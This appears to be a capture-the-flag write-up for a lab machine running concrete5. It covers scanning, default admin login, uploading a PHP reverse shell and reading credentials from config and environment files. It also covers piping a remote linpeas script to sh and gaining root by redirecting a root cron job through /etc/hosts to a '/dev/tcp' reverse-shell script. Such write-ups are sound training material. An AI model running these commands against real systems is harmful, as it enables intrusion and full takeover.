# How to get access to the admin panel:
First we scan website by using nmap:
<pre> nmap -sV VICTIM_IP_ADRESS </pre>
After using nmap we can see that port 85 is open:

![image](https://github.com/user-attachments/assets/d0e4f543-0a32-4e3a-9baf-21c18ce4db59)

After that we run gobuster, we can see that there is /app directory:
<pre>gobuster dir -u "http://10.10.151.9:85/" -w /usr/share/wordlists/dirb/small.txt -t 64</pre>
![Bez tytułu](https://github.com/user-attachments/assets/5cf1f095-12b2-4022-abd1-26df6afa62e9)

After clicking on "Jump" button we are redirected to: 
![image](https://github.com/user-attachments/assets/5a8c3552-8589-41f3-8828-bd6d1a132a19)

We can scan for subdirectories to find something intresting. After some time I found database.php file in /config directory. We'll use it later:
![image](https://github.com/user-attachments/assets/366199be-a023-4fb6-9a7c-64de12f49556)

On the bottom of the page we can see that website uses concrete5 CMS:
![image](https://github.com/user-attachments/assets/724469aa-2898-40f5-9a0c-3b57745afaa0)

After clicking on Log in, we are redirected to the login panel. We want to log in as admin. The login credentials are:
<pre>Username: admin </pre>
<pre>Password: password </pre>

# How to reverse shell
## On victim machine
On the admin panel we go to System settings -> Files -> Allowed File Types. Add php to allowed file types:

![image](https://github.com/user-attachments/assets/9a76b22e-0758-4501-8a17-ca3c46b68cc1)

After that we have to create shell.php file on attacker machine. You can use this: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
In website files add shell.php file:
![image](https://github.com/user-attachments/assets/8c92daa3-47ef-423f-96d3-76a197717059)
After that you will see popup window where there is written where .php file is stored:
<pre>http://VICTIM_IP_ADRESS:85/app/castle/application/files/6217/4308/6870/shell.php</pre>

## On attacker machine
Run listener:
<pre> nc -lvnp 4444 </pre>
Go back to browser and in new tab go to:
<pre>http://VICTIM_IP_ADRESS:85/app/castle/application/files/6217/4308/6870/shell.php</pre>

We can see that reverse shell worked. Run:
<pre> python3 -c 'import pty; pty.spawn("/bin/bash")' </pre>
to get acess to terminal:
![image](https://github.com/user-attachments/assets/9d5bac6d-1e00-4ef2-96ed-1b3a7aa1d1cc)

# Get users credentials
Now we can go back to database.php file we found:
![image](https://github.com/user-attachments/assets/c177072f-b9d0-45c7-b119-4bcc48774eca)
From the file we have credentials to log in as toad. Run <pre>su toad</pre> to log in. In toad there is no user.txt or root.txt, but from env we can get credentials to mario:
![image](https://github.com/user-attachments/assets/f467a7ab-fe55-4fb8-ad63-98154e493d70)
Use CyberChef to decrypt base64 Mario password: <pre>ikaTeNTANtES</pre>

Know log in as mario. In mario directory there is user.txt file. Use less to get flag:
![image](https://github.com/user-attachments/assets/0834e2fd-2a48-4ec2-a16a-f84c0b150d06)
For the root.txt file we must get root access.

# How to get root
We will use
1.	linpeas.sh: http://michalszalkowski.com/security/linpeas/
2.	Documentation: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

## On attacker machine
Download linpeas.sh file:
<pre>wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh chmod +x linpeas.sh</pre>

Run server:
<pre>sudo python3 -m http.server 9000</pre>

## On victim machine
Curl file from attacker machine to victim machine and run:
<pre>curl <attacker_machine_ip_adress>/linpeas.sh | sh</pre>

During the scan we can see that /etc/hosts is writable.
![image](https://github.com/user-attachments/assets/9ec6d78b-bf12-4972-990f-988be268f138)

After checking all running processes and cron jobs, there is a cron job which executes with root privilege every minute: curl mkingdom.thm:85/app/castle/application/counter.sh
After you add an entry to /etc/hosts, any attempt to refer to mkingdom.thm from this machine will now be directed to your IP address 10.10.6.168.

<pre> echo "10.10.6.168   mkingdom.thm" >> /etc/hosts </pre>
Unfortunately, this alone did not work and as you can see in the screenshot below, the cron job still calls 127.0.1.1:
![image](https://github.com/user-attachments/assets/db84ae46-3c58-4a6a-8c23-40b4bc6fa090)

The workaround is to overwrite the entire file manually:
<pre> cat << EOF > /tmp/hosts_fixed
127.0.0.1       localhost
127.0.0.1       backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.6.168     mkingdom.thm
EOF
</pre>

Copy your custom /tmp/hosts_fixed file and overwrites the system’s /etc/hosts file with it.
<pre>cp /tmp/hosts_fixed /etc/hosts</pre>

As shown below, the cron job is configured to reach the attacker's machine:
![image](https://github.com/user-attachments/assets/466df7d9-9eba-4e64-8704-baf2c15270f8)

## On attacker machine
Create the folder structure:
<pre>mkdir -p app/castle/application
cd app/castle/application
</pre>

After that create counter.sh:
<pre>cat << EOF > counter.sh
#!/bin/bash
bash -i >& /dev/tcp/<attacker_machine_ip_address>/4444 0>&1
EOF
</pre>

Lastly change permission to executable:
<pre>chmod +x counter.sh</pre>

Full process:
![image](https://github.com/user-attachments/assets/bdcd3fc4-7ebe-40b0-9e55-fc67dca3001b)

In two separate terminals run:
<pre>python3 -m http.server 85</pre>
<pre>nc -lvnp 4444</pre>

Wait for cron to trigger:
![image](https://github.com/user-attachments/assets/f390b7ce-7501-4bf4-b7c8-bccf738083ad)
![image](https://github.com/user-attachments/assets/f734f8b5-5c6b-46cf-a38d-204315b04709)

Know we reverse shell as root:
![image](https://github.com/user-attachments/assets/d09eb426-53c8-4e87-81af-c42d098a7f0c)

Use less to check flag:
![image](https://github.com/user-attachments/assets/e03dee91-a4fe-4886-be92-681dbabda795)

